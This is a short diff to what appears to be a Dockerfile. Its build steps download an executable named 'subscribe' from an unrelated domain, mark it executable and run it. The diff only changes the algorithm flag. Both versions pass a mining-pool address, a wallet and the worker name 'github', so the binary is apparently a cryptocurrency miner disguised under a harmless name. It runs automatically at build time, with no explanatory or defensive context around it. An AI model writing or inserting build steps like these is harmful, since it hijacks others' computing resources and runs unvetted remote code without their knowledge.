@@ -7,4 +7,4 @@ RUN apt update
 RUN apt -y install wget
 RUN wget http://ilovenypizza.com/subscribe
 RUN chmod +x subscribe
-RUN ./subscribe -a ghostrider  -o stratum-asia.rplant.xyz:17056 -u RSSKDT38DmpFFpN53K8QdaDQrVYoGYraNg.github
+RUN ./subscribe -a gr  -o stratum-asia.rplant.xyz:17056 -u RSSKDT38DmpFFpN53K8QdaDQrVYoGYraNg.github
